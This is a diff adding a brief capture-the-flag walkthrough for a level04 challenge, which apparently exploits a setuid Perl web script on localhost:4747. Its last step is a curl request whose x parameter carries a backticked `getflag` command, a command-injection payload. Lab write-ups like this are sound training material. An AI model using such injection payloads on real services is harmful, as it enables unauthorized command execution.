@@ -1,0 +1,13 @@
+1. `ls -l`
+   -rwsr-sr-x 1 flag04 level04 152 Mar  5  2016 level04.pl
+
+2. `cat level04.pl`
+   #!/usr/bin/perl
+   # localhost:4747
+   [...]
+   x(param("x"));
+
+3. `curl localhost:4747?x=test`
+   test
+
+4. `curl 'localhost:4747?x=`getflag`'`
